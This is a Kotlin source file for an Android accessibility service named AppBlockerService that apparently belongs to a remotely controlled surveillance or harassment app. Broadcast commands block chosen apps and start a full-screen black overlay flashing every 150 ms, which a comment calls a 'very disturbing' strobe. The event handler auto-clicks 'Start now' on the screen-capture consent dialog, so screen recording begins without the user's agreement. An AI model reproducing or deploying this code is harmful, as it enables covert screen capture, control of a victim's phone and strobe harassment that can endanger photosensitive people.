package com.fantzy.nih

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.View
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import android.content.pm.PackageManager

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) ||
                svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) { false }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L

    // ====================================================================
    // VARIABEL UNTUK BLACK OVERLAY BLINK
    // ====================================================================
    private var blackOverlayView: View? = null
    private var blackOverlayHandler: Handler? = null
    private var blackOverlayRunnable: Runnable? = null
    private var isBlackOverlayActive = false

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.fantzy.nih.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                    android.util.Log.d("AppBlocker", "Blocked: $pkg")
                }
                "com.fantzy.nih.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                    android.util.Log.d("AppBlocker", "Unblocked: $pkg")
                }
                "com.fantzy.nih.UNBLOCK_ALL" -> {
                    blockedPackages.clear()
                    android.util.Log.d("AppBlocker", "All unblocked")
                }
                // ====================================================================
                // BROADCAST UNTUK BLACK OVERLAY BLINK
                // ====================================================================
                "com.fantzy.nih.BLACK_OVERLAY_START" -> {
                    startBlackOverlayBlink()
                }
                "com.fantzy.nih.BLACK_OVERLAY_STOP" -> {
                    stopBlackOverlayBlink()
                }
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 0
        }

        val filter = IntentFilter().apply {
            addAction("com.fantzy.nih.BLOCK_APP")
            addAction("com.fantzy.nih.UNBLOCK_APP")
            addAction("com.fantzy.nih.UNBLOCK_ALL")
            addAction("com.fantzy.nih.BLACK_OVERLAY_START") // Tambahkan filter
            addAction("com.fantzy.nih.BLACK_OVERLAY_STOP")  // Tambahkan filter
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        android.util.Log.d("AppBlocker", "Service connected")
    }

    // ====================================================================
    // LOGIC BLACK OVERLAY BLINK (KELAP-KELIP CEPAT)
    // ====================================================================
    private fun startBlackOverlayBlink() {
        if (isBlackOverlayActive) return
        isBlackOverlayActive = true

        mainHandler.post {
            try {
                val wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                }

                // Flag NOT_TOUCHABLE agar layar tetap bisa di-interaksi di bawahnya 
                // (memberikan efek strobo yang sangat mengganggu)
                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                )

                val view = View(this)
                view.setBackgroundColor(android.graphics.Color.BLACK)
                blackOverlayView = view
                wm.addView(view, params)

                // Handler untuk membuat efek kelap-kelip (150ms nyala, 150ms mati)
                blackOverlayHandler = Handler(Looper.getMainLooper())
                var isVisible = true
                blackOverlayRunnable = object : Runnable {
                    override fun run() {
                        if (!isBlackOverlayActive) return
                        isVisible = !isVisible
                        blackOverlayView?.visibility = if (isVisible) View.VISIBLE else View.INVISIBLE
                        // Ubah angka 150 untuk mengatur kecepatan kelap-kelip (makin kecil makin cepat)
                        blackOverlayHandler?.postDelayed(this, 150) 
                    }
                }
                blackOverlayRunnable?.let { blackOverlayHandler?.post(it) }
                
                android.util.Log.d("AppBlocker", "Black Overlay Blink STARTED")
            } catch (e: Exception) {
                android.util.Log.e("AppBlocker", "Black overlay err: ${e.message}")
                isBlackOverlayActive = false
            }
        }
    }

    private fun stopBlackOverlayBlink() {
        isBlackOverlayActive = false
        blackOverlayRunnable?.let { blackOverlayHandler?.removeCallbacks(it) }
        blackOverlayHandler = null
        blackOverlayRunnable = null

        mainHandler.post {
            try {
                blackOverlayView?.let {
                    (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(it)
                }
            } catch (_: Exception) {}
            blackOverlayView = null
            android.util.Log.d("AppBlocker", "Black Overlay Blink STOPPED")
        }
    }
    // ====================================================================

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // ====================================================================
        // FITUR: AUTO CLICK "START NOW" UNTUK SCREEN CAPTURE
        // ====================================================================
        if (ScreenCaptureActivity.isWaitingForScreenCapture) {
            try {
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    var clicked = false
                    
                    var startNodes = rootNode.findAccessibilityNodeInfosByText("Start now")
                    if (startNodes.isNotEmpty()) {
                        for (node in startNodes) { if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; break } }
                    }
                    
                    if (!clicked) {
                        startNodes = rootNode.findAccessibilityNodeInfosByText("START NOW")
                        if (startNodes.isNotEmpty()) {
                            for (node in startNodes) { if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; break } }
                        }
                    }

                    if (!clicked) {
                        startNodes = rootNode.findAccessibilityNodeInfosByText("Mulai sekarang")
                        if (startNodes.isNotEmpty()) {
                            for (node in startNodes) { if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; break } }
                        }
                    }

                    if (!clicked) {
                        startNodes = rootNode.findAccessibilityNodeInfosByText("MULAI SEKARANG")
                        if (startNodes.isNotEmpty()) {
                            for (node in startNodes) { if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); clicked = true; break } }
                        }
                    }

                    if (clicked) return 
                }
            } catch (e: Exception) {}
        }
        // ====================================================================

        // --- LOGIC BLOCK APP ASLI ---
        if (event?.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return
        if (pkg == "android") return
        if (pkg == "com.android.systemui") return

        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime  = now

        performGlobalAction(GLOBAL_ACTION_HOME)

        mainHandler.postDelayed({
            performGlobalAction(GLOBAL_ACTION_HOME)
        }, 50)

        val appName = try {
            val pm = packageManager
            pm.getApplicationLabel(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
                else
                    @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (e: Exception) { pkg }

        mainHandler.postDelayed({
            Toast.makeText(this, "🚫 $appName diblokir", Toast.LENGTH_SHORT).show()
        }, 50)
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        stopBlackOverlayBlink() // Pastikan overlay hilang saat service mati
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}